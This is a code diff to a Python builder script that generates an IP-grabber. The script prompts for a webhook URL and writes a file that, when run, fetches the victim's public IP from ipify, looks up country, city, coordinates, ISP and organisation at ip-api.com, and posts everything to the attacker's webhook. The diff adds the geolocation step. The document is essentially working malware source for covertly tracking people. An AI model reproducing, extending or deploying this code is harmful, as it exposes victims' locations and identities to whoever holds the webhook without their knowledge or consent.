@@ -35,6 +35,15 @@ while True:
         print("To Long Name")
     if int(temp) < 135:
         break
+code = """import requests
+url = "https://api.ipify.org"
+r = requests.get(url).text
+r = str(r)
+requests.post(webhook, json={"content": f"@everyone ```Ip: {r}```"})
+r2 = requests.get(f"http://ip-api.com/json/{r}").json()
+"""
+code2 = 'info = "Country: " + r2["country"] + "\n" +  "Country Code: " + r2["countryCode"] + "\n" + "Region Name: " + r2["regionName"] + "\n" + "City: " + r2["city"] + "\n" + "Zip Code: " + r2["zip"] + "\n" + "Lat: " + str(r2["lat"]) + "\n" + "Lon: " + str(r2["lon"]) + "\n" + "Timezone: " + r2["timezone"] + "\n" + "ISP: " + r2["isp"] + "\n" + "Org: " + r2["org"] + "\n" + "AS: " + r2["as"]'
+code3 = 'requests.post(webhook, json={"content": f"```Ip Info: {info}```"})'
 while True:
     try:
         webhook = input("Enter Webhook: ")
@@ -47,19 +56,15 @@ while True:
         print("Webhook Invalid")
 try:
     file = open(f"{name}.py", "a")
-    file.write("import requests\n")
     file.write(f'webhook = "{webhook}"\n')
-    file.write('url = "https://api.ipify.org"\n')
-    file.write("r = requests.get(url).text\n")
-    file.write("r = str(r)\n")
-    file.write('requests.post(webhook, json={"content": f"@everyone ```Ip: {r}```"})')
+    file.write(code)
+    file.write(repr(code2)[1:-1]+"\n")
+    file.write(code3)
     file.close()
 except:
     print("Unkown Error")
     input("")
     exit()
-
-
 print("Succsesfully Made File")
 input("")
 exit()
